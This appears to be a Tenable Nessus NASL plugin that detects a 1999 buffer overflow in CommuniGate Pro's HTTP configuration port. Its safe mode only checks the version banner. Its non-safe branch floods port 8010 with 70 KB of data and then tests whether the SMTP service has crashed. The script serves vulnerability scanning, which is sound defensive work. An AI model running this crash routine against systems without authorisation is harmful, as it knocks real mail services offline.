#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(10048);
 script_version ("$Revision: 1.22 $");
 script_cve_id("CVE-1999-0865");
 script_bugtraq_id(860);
 script_xref(name:"OSVDB", value:"41");

 script_name(english:"CommuniGate Pro HTTP Configuration Port Remote Overflow");
 script_summary(english:"Crashes the remote service");
 
  script_set_attribute(
    attribute:"synopsis",
    value:"The remote service has a buffer overflow vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:string(
      "The remote host appears to be running Communigate Pro, a commercial\n",
      "email and groupware application.\n",
      "\n",
      "It was possible to crash this service by :\n",
      "\n",
      "  - First, connecting to port 8010 and sending 70 KB\n",
      "    of data (AAA[...]AAA) followed by '\\r\\n'.\n",
      "\n",
      "  - Then, connecting to port 25.\n",
      "\n",
      "A remote attacker could exploit this to crash the service, or\n",
      "possibly execute arbitrary code."
    )
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://archives.neohapsis.com/archives/bugtraq/1999-q4/0209.html"
  );
  script_set_attribute(
    attribute:"solution",
    value:"Upgrade to Communigate Pro version 3.2 or later."
  );
  script_set_attribute(
    attribute:"cvss_vector",
    value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
  );
  script_end_attributes();

 script_category(ACT_MIXED_ATTACK); # mixed
 script_family(english:"Web Servers");
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
 script_dependencie("find_service1.nasl");
 script_require_ports(8010);
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) exit(0);

if(safe_checks())
{
 banner = get_http_banner(port:8010);
 
 if(banner)
  {
  if(egrep(pattern:"^Server: CommuniGatePro/3\.[0-1]",
  	  string:banner))
	  {
	   alrt = 
"Nessus reports this vulnerability using only information that was
gathered. Use caution when testing without safe checks enabled.";
	   security_hole(port:8010, extra:alrt);
	  }
  }
 exit(0);
}


if(get_port_state(8010))
{
 if(get_port_state(25))
 {
 soc25 = open_sock_tcp(25);
 if(soc25)
 {
  r = recv_line(socket:soc25, length:1024);
  if(!r)exit(0);
  close(soc25);
  soc = open_sock_tcp(8010);
  if(soc)
  {
  data = crap(1024);
  end = string("\r\n");
  for(i=0;i<70;i=i+1)
  {
  send(socket:soc, data:data);
  }
  send(socket:soc, data:end);
  r = http_recv3(socket:soc);
  close(soc);
 
  soc25 = open_sock_tcp(25);
  rep = recv_line(socket:soc25, length:1024);
  if(!rep)security_hole(8010);
  close(soc25);
   }
  }
 }
}
